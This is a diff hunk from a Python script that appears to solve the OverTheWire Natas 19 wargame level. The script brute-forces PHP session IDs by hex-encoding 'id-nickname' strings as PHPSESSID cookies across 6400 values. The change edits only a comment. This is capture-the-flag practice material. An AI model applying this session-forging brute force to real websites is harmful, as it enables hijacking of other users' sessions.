@@ -4,7 +4,7 @@ url = "http://natas19.natas.labs.overthewire.org/"
 auth  = ("natas19", "secret")
 
 for sess_id in range(1, 6400):
-    session_str = f"{sess_id}-nickname" # Nickname - Every letter/word that you print in field with name "Username" If field empty, cookie contains only number ID and BruteForce of sess_id be harder
+    session_str = f"{sess_id}-nickname" # Nickname - Every letter/word that you print in field with name "Username" If field empty, cookie contains only number ID
 
     hex_cookie = session_str.encode().hex() # This line encode your PHPSESSID cookie in HEX
 
